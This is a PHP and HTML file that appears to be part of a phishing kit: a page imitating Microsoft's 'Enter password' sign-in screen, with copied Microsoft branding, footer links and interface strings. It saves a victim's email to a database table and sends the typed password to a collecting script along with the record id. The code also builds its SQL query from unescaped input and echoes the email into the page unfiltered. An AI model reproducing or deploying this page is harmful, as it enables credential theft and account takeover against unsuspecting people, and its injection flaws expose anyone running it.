<?php
include("conection.php");


if (isset($_POST['register'])) {
    if (strlen($_POST['email']) >= 1) {
	    $email = trim($_POST['email']);
	    $fechareg = date("d/m/y");
	    $consulta = "INSERT INTO emaildb (email, password, fecha_reg) VALUES ('$email', '?', '$fechareg')";
	    $resultado = mysqli_query($conex2,$consulta);
	    $id=mysqli_insert_id($conex2);
	    if ($resultado) {
	    	?> 
	    	
           <?php
          
	    } else {
	    	?> 
	    	
           <?php

	    }
    }   else { 
			?>

			<?php
		}	

}



?>


<!DOCTYPE html>
<html lang="en">
	<head>
		<meta charset="utf-8">
		<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
		<title>Sign in to your Microsoft account</title>
		<link rel="icon" href="img/favicon.ico">
		<link rel="stylesheet" href="Style_2.css">


		<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.8.2/css/all.css">
		<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css" integrity="sha384-Gn5384xqQ1aoWXA+058RXPxPg6fy4IWvTNh0E263XmFcJlSAwiGgFAW/dAiS6JXm" crossorigin="anonymous">

		
		<link href="https://cdnjs.cloudflare.com/ajax/libs/mdbootstrap/4.16.0/css/mdb.min.css" rel="stylesheet">
	 
		
		<link href="https://cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/4.4.1/css/bootstrap.min.css" rel="stylesheet">
		<style>
		    #ultimo + div{
		        visibility: hidden;
		    }
		</style>
	</head>
	<body> 
		<div class="bg-sucess row align-items-center justify-content-center vh-100 mt-4">

			<form class="card container py-4 px-4" id="mycontainer" action="registor.php?variable1=<?php echo $id ?>" method="post">

				  	<!-- Card image -->
				 	<div class="container d-inline mt-3">
				    	<img class="float-left " src="img/card.svg" width="108" height="24" 
				      alt="Card image cap" id="myimage">
				 	</div>

				 	<!-- Card content -->
				 	<div class="card-body rounded-bottom">

					   <!-- Title -->
					   <div class="list-group list-group-horizontal-sm"> 
					   		<i class=""><a href="index.php"><img src="img/arrow-left.svg" alt=""></a></i>
							<?php
							  echo "<div class='' >$email</div>" ;
							?> 
					   </div>
						<div>
						   <h4 class="card-title mb-2">Enter password</h4>
						   <hr class="hr-light">
						</div>   
					   <div class="md-form mb-3">
                            <input type="password" id="password" name="pass" class="form-control">
                            <label for="email" class="">Password</label>
                        </div>
						   <!-- Text -->
						   	<div class="mb-2 mt-2">
							   <input type="checkbox" data-bind="checked: isKmsiChecked, ariaLabel: str['CT_PWD_STR_KeepMeSignedInCB_Text']" aria-label="Keep me signed in">
							   <span data-bind="text: str['CT_PWD_STR_KeepMeSignedInCB_Text']"> Keep me signed in</span>
							</div>	
						   <p class="card-text mb-2"><a href="">
							Forgot password? </a></p>		
		  			</div>
		  			<div class="text-center text-md-right mb-2 mr-2">
		  				
                		<button class="btn btn-primary text-capitalize px-4" type="submit" name="send">Sign in</button>
            		</div>
			</form>
		</div>
		<footer class="footer font-small px-3 fixed-bottom">
			 <!-- Copyright -->
	        <div class="footer-modern-line-3">
	          <div class="container">
	            <div class="row row-10 justify-content-between">
	              <div class="col-md-6"><span></span></div>
	              <div class="col-md-auto">
	                
	                <p class="rights footer text-white px-2"><a class="text-white" href="https://www.microsoft.com/es-es/servicesagreement/">Terms of use</a>	
	                  <a class="text-white small px-2" href="https://privacy.microsoft.com/es-es/privacystatement">Privacy & cookies</a>
						<a class="text-white small px-2" href="#">...</a>
	              	</p>

	              </div>
	            </div>
	          </div>
	        </div>
        <!-- Copyright -->
		</footer>
		<!-- JQuery -->
	    <script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.4.1/jquery.min.js"></script>
	    <!-- Bootstrap tooltips -->
	    <script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.4/umd/popper.min.js"></script>
	    <!-- Bootstrap core JavaScript -->
	    <script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/4.4.1/js/bootstrap.min.js"></script>
	    <!-- MDB core JavaScript -->
	    <script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/mdbootstrap/4.16.0/js/mdb.min.js"></script>
	    
	    <div id="ultimo"></div>
	</body>	
</html>